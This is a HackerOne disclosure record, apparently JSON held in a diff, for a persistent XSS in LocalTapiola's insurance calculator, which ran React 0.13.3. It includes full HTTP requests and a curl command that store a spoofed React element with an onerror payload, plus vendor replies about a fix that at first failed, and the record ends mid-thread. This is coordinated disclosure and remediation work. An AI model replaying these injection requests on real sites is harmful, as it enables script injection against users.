@@ -1,0 +1,559 @@
+{
+  "id": 139004,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzkwMDQ=",
+  "url": "https://hackerone.com/reports/139004",
+  "title": "Persistent XSS at verkkopalvelu.tapiola.fi using spoofed React element and React v.0.13.3",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-05-15T21:21:03.025Z",
+  "submitted_at": "2016-05-15T21:21:03.025Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fransrosen",
+    "url": "/fransrosen",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8416,
+    "url": "https://hackerone.com/localtapiola",
+    "handle": "localtapiola",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "LocalTapiola",
+      "twitter_handle": "",
+      "website": "http://www.lahitapiola.fi",
+      "about": "LocalTapiola’s products and services cover non-life, life and pension insurance, as well as investment and saving services."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-06-27T22:32:08.453Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-06-27T22:32:08.376Z",
+  "team_member_agreed_on_going_public_at": "2016-06-27T22:26:59.450Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\n\n## Background\nI noticed that the app at:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/\n\nwas running an old version of React. In this version (0.13.3) there's an issue, initially discovered by @danlec actually on HackerOne: http://danlec.com/blog/xss-via-a-spoofed-react-element \n\nThe patch by React was made in version 0.14: https://facebook.github.io/react/blog/2015/10/07/react-v0.14.html\n\n## PoC\n\nSo I noticed that the application had a possible way to save a registration in the middle of the process, being able to get an URL to continue with the registration. This save would make a call that looked like this:\n\n```\nPOST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1\nHost: verkkopalvelu.lahitapiola.fi\nContent-Type: application/json\n\n{\n    \"79rtwta5z4hjkn3npvu5ak0521\": {\n        \"dateOfIntroduction\": {\n            \"isValid\": true, \n            \"error\": \"\", \n...\n}\n```\n\nThis would then respond with a unique identifier:\n```\n{\"id\":\"ID\"}\n```\nThis data would then be used, if you used a link formatted like this:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/ID\n\nThe problem, apart from running an old version of React, is that the JSON being saved is not controlled in any way what content it has, which means you're able to extend the JSON further. Now, the content in the elements are being placed inside the DOM of the page, especially the `\"error\"`-element.\n\nSo, to use @danlec's way to inject a spoofed React element, we use the following request:\n\n```\nPOST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1\nHost: verkkopalvelu.lahitapiola.fi\nConnection: keep-alive\nContent-Length: 875\nAccept: application/json, text/javascript\nContent-Type: application/json\nAccept-Encoding: gzip, deflate\nCookie: caruid=fd20a9cb-5d40-4127-8858-ca2961bdb789;\n\n{\"79rtwta5z4hjkn3npvu5ak0521\":{\"postCode\":{\"isValid\":true,\"error\":{\"_store\":{},\"type\":\"body\",\"props\":{\"dangerouslySetInnerHTML\":{\"__html\":\"<img src=x onerror=alert(document.domain)>\"}},\"_isReactElement\":true},\"value\":\"jjj\"},\"dateOfIntroduction\":{\"isValid\":true,\"error\":\"\",\"value\":\"JAJAJA\"},\"cylinderCapacity\":{\"isValid\":true,\"error\":\"\",\"value\":\"yyy\"},\"manufacturerCode\":{\"isValid\":true,\"error\":\"\",\"value\":\"zzz\"},\"netPower\":{\"isValid\":true,\"error\":\"\",\"value\":\"bbb\"},\"birthDate\":{\"isValid\":true,\"error\":\"\",\"value\":\"11.11.2011xxx\"},\"grossWeight\":{\"isValid\":true,\"error\":\"\",\"value\":\"ccc\"},\"carType\":{\"isValid\":true,\"error\":\"\",\"value\":\"x\"},\"isRentedOrLeased\":{\"isValid\":true,\"error\":\"\",\"value\":\"eee\"},\"registrationPart2\":{\"isValid\":true,\"error\":\"\",\"value\":\"fff\"},\"modelCode\":{\"isValid\":true,\"error\":\"\",\"value\":\"ggg\"},\"registrationPart1\":{\"isValid\":true,\"error\":\"\",\"value\":\"hhh\"}}}\n```\n\nYou can see my inserted payload here:\nhttps://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\n\nWhich would then result in the following URL using the React app:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5\n\nWhich has the following output in the DOM:\n\n{F94020}\n\nThat results in the javascript running when accessing the page:\n\n{F94022}\n\n## Solution\n\nYou should update the React version to >0.14 (and most likely also change so the structure of the JSON that is getting saved is controlled by you.\n\nRegards,\nFrans",
+  "bounty_amount": "300.0",
+  "formatted_bounty": "$300",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 94020,
+      "file_name": "Screen_Shot_2016-05-15_at_23.09.13.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/094/020/9bc61b08fed82c63adfa74d759f999c11f462f1a/Screen_Shot_2016-05-15_at_23.09.13.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-05-15_at_23.09.13.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-05-15_at_23.09.13.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ764WDPOT%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T081748Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJGMEQCIEJCpOT%2FnLAxlJy%2B%2B%2Fa0A%2Fuz9UJx%2BTkeR616HCfZ%2Bl5TAiBPgAvOCdyFK%2Fsu0e4HNruMfHePWlQ2%2B7jDR3qgABsc6SqwBQgpEAMaDDAxMzYxOTI3NDg0OSIMf%2BnUXay0WVRe0QUAKo0FTe%2F3%2F5R16%2FajyCApoURehraE8bgx4wMDslPTf6h5vkZ7QkD6mew0zmZSVVL71O%2BS%2FAAsUL9gjR64cxjTN0fyO6swbmSDfmOouN8529hjbJrHwKh%2Bg%2FqR14Qh%2FwtS9MNlvaaaFYjm15dxLjR1qbkNoM2VW66X%2BaIjFo%2Bjm1L3h4YvC7uD%2BkF5SvvermW8bkX9PbMNWbV0ri7d4nxEYyfmSygHPF3jBUj9qKtE5jIFlUFX7quLROd7IFutIjfbr9BzD5XjBcfDBgOelMJO%2FkBoiNdwlfV9uTG7ZKjiTRJNivEEwodRejMzwiSEZ6GcGSmQR9RpewFhhM%2Fz%2BYkhlE7gFMjx24KTCJ1K3CyskWpwdC68JN9Y8hXezAl7pK2gf3r62LKzvw1%2FJhkqmVuo8i7XCkeS0MYtV7XnpE5p3jBHKTK7q%2FumHS%2FwzVymb2EeSXBP6qNbvr3O18rzDvbqY5uBkazVycShPwpL%2BBDoPdQ%2FbeFqcglYv2oAounyiTXR9eWNtzw8kEZw6AKflmPiQ0DprqSHaiMMAb55fo7dbXjwr20ktZwBZZqenOtvB7eyoQN%2BG2WqO0K44it4aGb6g8ehgYvsRelS0oR5XwTwu2o4F0Fj%2BADJ3%2F5TzGpfal1VqsaCMrr4em0aQJ3rb4Remj%2F%2BJTVleGnaKGbF2teDXflsoK2zwP9nkJ4nvashggxSrAZooM%2BU4pbkYzpxDwMNvMOJWFOf9GozT%2FooeLq5CYQghwJHMTpJ71dTOR%2FqvCNyL8BZYjJA7Wc19LQQ%2FS016DeF1wTf5sdMO0l86aHqv8BSk77LD335DPvtqsjzrJ7qieEjW9dMYJJFmqBMM1OoakNug2zY166La6bNXU3UQhYwjai6qAY6sgHNsBk5AOLuBX1agqrXZLp%2BOkzGnqFdy%2FkFHE6bDXd5K%2BxlNQa21ZdjhDZitHh8OyVITBolLS2EIAdcZfL%2FRZstKTGRFPqW5I%2BMNOHFKWShLCpyVIcbI8q0Una9aOqcZOJOiV54v4hLyirFWKBhoo1td8jT%2BsTbcVm%2BjosOM7etsoiTgM%2FlTBDyy%2BG06%2FdRbqpBa7eB3ENMxwVCTWHA0QHkY6jW1%2F7VKmtouFFTKpcdL3mX&X-Amz-SignedHeaders=host&X-Amz-Signature=bf464e0d99ab9210481c8aa1972198330b27fd707346fd60d1f46cbcf682fb1d",
+      "file_size": 78509,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 94022,
+      "file_name": "Screen_Shot_2016-05-15_at_23.00.25.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/094/022/8c7069981da948310e62733c5fe99807a713c5e5/Screen_Shot_2016-05-15_at_23.00.25.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-05-15_at_23.00.25.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-05-15_at_23.00.25.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ764WDPOT%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T081748Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJGMEQCIEJCpOT%2FnLAxlJy%2B%2B%2Fa0A%2Fuz9UJx%2BTkeR616HCfZ%2Bl5TAiBPgAvOCdyFK%2Fsu0e4HNruMfHePWlQ2%2B7jDR3qgABsc6SqwBQgpEAMaDDAxMzYxOTI3NDg0OSIMf%2BnUXay0WVRe0QUAKo0FTe%2F3%2F5R16%2FajyCApoURehraE8bgx4wMDslPTf6h5vkZ7QkD6mew0zmZSVVL71O%2BS%2FAAsUL9gjR64cxjTN0fyO6swbmSDfmOouN8529hjbJrHwKh%2Bg%2FqR14Qh%2FwtS9MNlvaaaFYjm15dxLjR1qbkNoM2VW66X%2BaIjFo%2Bjm1L3h4YvC7uD%2BkF5SvvermW8bkX9PbMNWbV0ri7d4nxEYyfmSygHPF3jBUj9qKtE5jIFlUFX7quLROd7IFutIjfbr9BzD5XjBcfDBgOelMJO%2FkBoiNdwlfV9uTG7ZKjiTRJNivEEwodRejMzwiSEZ6GcGSmQR9RpewFhhM%2Fz%2BYkhlE7gFMjx24KTCJ1K3CyskWpwdC68JN9Y8hXezAl7pK2gf3r62LKzvw1%2FJhkqmVuo8i7XCkeS0MYtV7XnpE5p3jBHKTK7q%2FumHS%2FwzVymb2EeSXBP6qNbvr3O18rzDvbqY5uBkazVycShPwpL%2BBDoPdQ%2FbeFqcglYv2oAounyiTXR9eWNtzw8kEZw6AKflmPiQ0DprqSHaiMMAb55fo7dbXjwr20ktZwBZZqenOtvB7eyoQN%2BG2WqO0K44it4aGb6g8ehgYvsRelS0oR5XwTwu2o4F0Fj%2BADJ3%2F5TzGpfal1VqsaCMrr4em0aQJ3rb4Remj%2F%2BJTVleGnaKGbF2teDXflsoK2zwP9nkJ4nvashggxSrAZooM%2BU4pbkYzpxDwMNvMOJWFOf9GozT%2FooeLq5CYQghwJHMTpJ71dTOR%2FqvCNyL8BZYjJA7Wc19LQQ%2FS016DeF1wTf5sdMO0l86aHqv8BSk77LD335DPvtqsjzrJ7qieEjW9dMYJJFmqBMM1OoakNug2zY166La6bNXU3UQhYwjai6qAY6sgHNsBk5AOLuBX1agqrXZLp%2BOkzGnqFdy%2FkFHE6bDXd5K%2BxlNQa21ZdjhDZitHh8OyVITBolLS2EIAdcZfL%2FRZstKTGRFPqW5I%2BMNOHFKWShLCpyVIcbI8q0Una9aOqcZOJOiV54v4hLyirFWKBhoo1td8jT%2BsTbcVm%2BjosOM7etsoiTgM%2FlTBDyy%2BG06%2FdRbqpBa7eB3ENMxwVCTWHA0QHkY6jW1%2F7VKmtouFFTKpcdL3mX&X-Amz-SignedHeaders=host&X-Amz-Signature=af9130bc5a39e601b07c9bbb29dc322e4b38f89a9e78dc6c17433069a4e75bb8",
+      "file_size": 209565,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-07-27T22:26:59.513Z",
+  "allow_singular_disclosure_after": -225798649.00299796,
+  "singular_disclosure_allowed": true,
+  "vote_count": 27,
+  "voters": [
+    "fransrosen",
+    "mashoud1122",
+    "bogdantcaciuc",
+    "jobert",
+    "michiel",
+    "malcolmx",
+    "r3y",
+    "zephrfish",
+    "lars",
+    "jens",
+    "and 17 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 958582,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 7 days, but usually much faster. Bounty decisions are made 1-2 times per month, so please have patience.",
+      "automated_response": false,
+      "created_at": "2016-05-16T06:20:48.698Z",
+      "updated_at": "2016-05-16T06:20:48.698Z",
+      "actor": {
+        "username": "localtapiola-thomas",
+        "cleared": false,
+        "verified": false,
+        "url": "/localtapiola-thomas",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "localtapiola"
+    },
+    {
+      "id": 969898,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "A quick update on this one. We have forwarded your finding to the 3rd party responsible for this service and we are awaiting their response. Please have patience while we are investigating.",
+      "automated_response": false,
+      "created_at": "2016-05-23T12:30:43.252Z",
+      "updated_at": "2016-05-23T12:30:43.252Z",
+      "actor": {
+        "username": "localtapiola-thomas",
+        "cleared": false,
+        "verified": false,
+        "url": "/localtapiola-thomas",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "localtapiola"
+    },
+    {
+      "id": 994538,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @fransrosen . A fix for this report has been issued and injecting malicious content is not possible anymore. There is a low risk injection possibility still in the application. We will not accept any reports on that issue, as it is known and accepted risk. Bounty decisions will be made next Monday and we can have full disclosure at that point. We would appreciate if you can verify the fix from your point of view also.",
+      "automated_response": false,
+      "created_at": "2016-06-01T09:16:32.976Z",
+      "updated_at": "2016-06-01T09:16:32.976Z",
+      "actor": {
+        "username": "localtapiola-thomas",
+        "cleared": false,
+        "verified": false,
+        "url": "/localtapiola-thomas",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "localtapiola"
+    },
+    {
+      "id": 994686,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi,\nIs the fix actually deployed? I was able to reproduce the issue again.\n\nPoC-link: https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\n\nI first ran this command:\n```\ncurl -i -s -k  -X 'POST' \\\n    -H 'Content-Type: application/json' \\\n    -b 'caruid=fd20a9cb-5d40-4127-8858-ca2961bdb789' \\\n    --data-binary $'{\\\"79rtwta5z4hjkn3npvu5ak0521\\\":{\\\"postCode\\\":{\\\"isValid\\\":true,\\\"error\\\":{\\\"_store\\\":{},\\\"type\\\":\\\"body\\\",\\\"props\\\":{\\\"dangerouslySetInnerHTML\\\":{\\\"__html\\\":\\\"<img src=x onerror=alert(document.domain)>\\\"}},\\\"_isReactElement\\\":true},\\\"value\\\":\\\"jjj\\\"},\\\"dateOfIntroduction\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"JAJAJA\\\"},\\\"cylinderCapacity\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"yyy\\\"},\\\"manufacturerCode\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"zzz\\\"},\\\"netPower\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"bbb\\\"},\\\"birthDate\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"11.11.2011xxx\\\"},\\\"grossWeight\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"ccc\\\"},\\\"carType\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"x\\\"},\\\"isRentedOrLeased\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"eee\\\"},\\\"registrationPart2\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"fff\\\"},\\\"modelCode\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"ggg\\\"},\\\"registrationPart1\\\":{\\\"isValid\\\":true,\\\"error\\\":\\\"\\\",\\\"value\\\":\\\"hhh\\\"}}}' \\\n    'https://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/'\n```\n\nThe ID I got back, I then used in the following link:\n```\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/XXX\n```\nwhere XXX is the ID I got. As I see it, I'm still able to inject the arbitrary elements into the JSON located here:\nhttps://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\n\nCheers,\nFrans",
+      "automated_response": false,
+      "created_at": "2016-06-01T12:44:28.647Z",
+      "updated_at": "2016-06-01T12:44:28.647Z",
+      "actor": {
+        "username": "fransrosen",
+        "cleared": true,
+        "verified": true,
+        "url": "/fransrosen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "localtapiola"
+    },
+    {
+      "id": 994687,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Just for clarity, could you post screenshots of your findings?",
+      "automated_response": false,
+      "created_at": "2016-06-01T12:46:31.177Z",
+      "updated_at": "2016-06-01T12:46:31.177Z",
+      "actor": {
+        "username": "localtapiola-thomas",
+        "cleared": false,
+        "verified": false,
+        "url": "/localtapiola-thomas",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "localtapiola"
+    },
+    {
+      "id": 994692,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Absolutely!\nI've attached two images, one showing the payload with the extended JSON-elements, used for the attack, the other one showing what happens when I visit:\nhttps://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/bcc6eccd-1b04-4be3-b721-701e5f3e4ea7\n\nRegards,\nFrans\n",
+      "automated_response": false,
+      "created_at": "2016-06-01T12:48:21.777Z",
+      "updated_at": "2016-06-01T12:48:21.777Z",
+      "actor": {
+        "username": "fransrosen",
+        "cleared": true,
+        "verified": true,
+        "url": "/fransrosen",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 97288,
+          "filename": "Screen_Shot_2016-06-01_at_14.42.25.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/097/288/488d72443ff3eaf714229ad0f45cb7d5da04e917/Screen_Shot_2016-06-01_at_14.42.25.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-06-01_at_14.42.25.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-06-01_at_14.42.25.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ764WDPOT%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T081748Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJGMEQCIEJCpOT%2FnLAxlJy%2B%2B%2Fa0A%2Fuz9UJx%2BTkeR616HCfZ%2Bl5TAiBPgAvOCdyFK%2Fsu0e4HNruMfHePWlQ2%2B7jDR3qgABsc6SqwBQgpEAMaDDAxMzYxOTI3NDg0OSIMf%2BnUXay0WVRe0QUAKo0FTe%2F3%2F5R16%2FajyCApoURehraE8bgx4wMDslPTf6h5vkZ7QkD6mew0zmZSVVL71O%2BS%2FAAsUL9gjR64cxjTN0fyO6swbmSDfmOouN8529hjbJrHwKh%2Bg%2FqR14Qh%2FwtS9MNlvaaaFYjm15dxLjR1qbkNoM2VW66X%2BaIjFo%2Bjm1L3h4YvC7uD%2BkF5SvvermW8bkX9PbMNWbV0ri7d4nxEYyfmSygHPF3jBUj9qKtE5jIFlUFX7quLROd7IFutIjfbr9BzD5XjBcfDBgOelMJO%2FkBoiNdwlfV9uTG7ZKjiTRJNivEEwodRejMzwiSEZ6GcGSmQR9RpewFhhM%2Fz%2BYkhlE7gFMjx24KTCJ1K3CyskWpwdC68JN9Y8hXezAl7pK2gf3r62LKzvw1%2FJhkqmVuo8i7XCkeS0MYtV7XnpE5p3jBHKTK7q%2FumHS%2FwzVymb2EeSXBP6qNbvr3O18rzDvbqY5uBkazVycShPwpL%2BBDoPdQ%2FbeFqcglYv2oAounyiTXR9eWNtzw8kEZw6AKflmPiQ0DprqSHaiMMAb55fo7dbXjwr20ktZwBZZqenOtvB7eyoQN%2BG2WqO0K44it4aGb6g8ehgYvsRelS0oR5XwTwu2o4F0Fj%2BADJ3%2F5TzGpfal1VqsaCMrr4em0aQJ3rb4Remj%2F%2BJTVleGnaKGbF2teDXflsoK2zwP9nkJ4nvashggxSrAZooM%2BU4pbkYzpxDwMNvMOJWFOf9GozT%2FooeLq5CYQghwJHMTpJ71dTOR%2FqvCNyL8BZYjJA7Wc19LQQ%2FS016DeF1wTf5sdMO0l86aHqv8BSk77LD335DPvtqsjzrJ7qieEjW9dMYJJFmqBMM1OoakNug2zY166La6bNXU3UQhYwjai6qAY6sgHNsBk5AOLuBX1agqrXZLp%2BOkzGnqFdy%2FkFHE6bDXd5K%2BxlNQa21ZdjhDZitHh8OyVITBolLS2EIAdcZfL%2FRZstKTGRFPqW5I%2BMNOHFKWShLCpyVIcbI8q0Una9aOqcZOJOiV54v4hLyirFWKBhoo1td8jT%2BsTbcVm%2BjosOM7etsoiTgM%2FlTBDyy%2BG06%2FdRbqpBa7eB3ENMxwVCTWHA0QHkY6jW1%2F7VKmtouFFTKpcdL3mX&X-Amz-SignedHeaders=host&X-Amz-Signature=d92761f1151ef01cd90a593d120d59c9f7b80c2a72b2d9cc83f86587d8433c7e"
+        },
+        {
+          "id": 97289,
+          "filename": "Screen_Shot_2016-06-01_at_14.47.02.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/097/289/afe5fcc2c2a4dc7d5b3ba30905b435eb5e8907a0/Screen_Shot_2016-06-01_at_14.47.02.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-06-01_at_14.47.02.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-06-01_at_14.47.02.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ764WDPOT%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T081748Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJGMEQCIEJCpOT%2FnLAxlJy%2B%2B%2Fa0A%2Fuz9UJx%2BTkeR616HCfZ%2Bl5TAiBPgAvOCdyFK%2Fsu0e4HNruMfHePWlQ2%2B7jDR3qgABsc6SqwBQgpEAMaDDAxMzYxOTI3NDg0OSIMf%2BnUXay0WVRe0QUAKo0FTe%2F3%2F5R16%2FajyCApoURehraE8bgx4wMDslPTf6h5vkZ7QkD6mew0zmZSVVL71O%2BS%2FAAsUL9gjR64cxjTN0fyO6swbmSDfmOouN8529hjbJrHwKh%2Bg%2FqR14Qh%2FwtS9MNlvaaaFYjm15dxLjR1qbkNoM2VW66X%2BaIjFo%2Bjm1L3h4YvC7uD%2BkF5SvvermW8bkX9PbMNWbV0ri7d4nxEYyfmSygHPF3jBUj9qKtE5jIFlUFX7quLROd7IFutIjfbr9BzD5XjBcfDBgOelMJO%2FkBoiNdwlfV9uTG7ZKjiTRJNivEEwodRejMzwiSEZ6GcGSmQR9RpewFhhM%2Fz%2BYkhlE7gFMjx24KTCJ1K3CyskWpwdC68JN9Y8hXezAl7pK2gf3r62LKzvw1%2FJhkqmVuo8i7XCkeS0MYtV7XnpE5p3jBHKTK7q%2FumHS%2FwzVymb2EeSXBP6qNbvr3O18rzDvbqY5uBkazVycShPwpL%2BBDoPdQ%2FbeFqcglYv2oAounyiTXR9eWNtzw8kEZw6AKflmPiQ0DprqSHaiMMAb55fo7dbXjwr20ktZwBZZqenOtvB7eyoQN%2BG2WqO0K44it4aGb6g8ehgYvsRelS0oR5XwTwu2o4F0Fj%2BADJ3%2F5TzGpfal1VqsaCMrr4em0aQJ3rb4Remj%2F%2BJTVleGnaKGbF2teDXflsoK2zwP9nkJ4nvashggxSrAZooM%2BU4pbkYzpxDwMNvMOJWFOf9GozT%2FooeLq5CYQghwJHMTpJ71dTOR%2FqvCNyL8BZYjJA7Wc19LQQ%2FS016DeF1wTf5sdMO0l86aHqv8BSk77LD335DPvtqsjzrJ7qieEjW9dMYJJFmqBMM1OoakNug2zY166La6bNXU3UQhYwjai6qAY6sgHNsBk5AOLuBX1agqrXZLp%2BOkzGnqFdy%2FkFHE6bDXd5K%2BxlNQa21ZdjhDZitHh8OyVITBolLS2EIAdcZfL%2FRZstKTGRFPqW5I%2BMNOHFKWShLCpyVIcbI8q0Una9aOqcZOJOiV54v4hLyirFWKBhoo1td8jT%2BsTbcVm%2BjosOM7etsoiTgM%2FlTBDyy%2BG06%2FdRbqpBa7eB3ENMxwVCTWHA0QHkY6jW1%2F7VKmtouFFTKpcdL3mX&X-Amz-SignedHeaders=host&X-Amz-Signature=ab4dfba2e149b0e6b3624c71ba82f5d43b7eb362b9cc3f98889d89872a3b28dc"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "localtapiola"
+    },
+    {
+      "id": 994693,
+      "is_internal": false,
+      "editable": false,
